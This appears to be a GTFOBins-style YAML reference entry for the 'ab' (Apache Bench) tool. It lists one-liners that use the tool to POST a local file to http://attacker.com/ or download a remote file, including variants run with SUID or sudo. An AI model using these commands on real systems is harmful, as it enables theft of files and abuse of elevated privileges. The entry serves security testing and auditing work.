---
functions:
  file-upload:
    - description: Upload local file via HTTP POST request.
      code: |
        URL=http://attacker.com/
        LFILE=file_to_send
        ab -p $LFILE $URL
  file-download:
    - description: Fetch a remote file via HTTP GET request. The response is returned as part of the verbose output of the program with some limitations on the length.
      code: |
          URL=http://attacker.com/file_to_download
          ab -v2 $URL
  suid:
    - description: Upload local file via HTTP POST request.
      code: |
        URL=http://attacker.com/
        LFILE=file_to_send
        ./ab -p $LFILE $URL
  sudo:
    - description: Upload local file via HTTP POST request.
      code: |
        URL=http://attacker.com/
        LFILE=file_to_send
        sudo ab -p $LFILE $URL
---
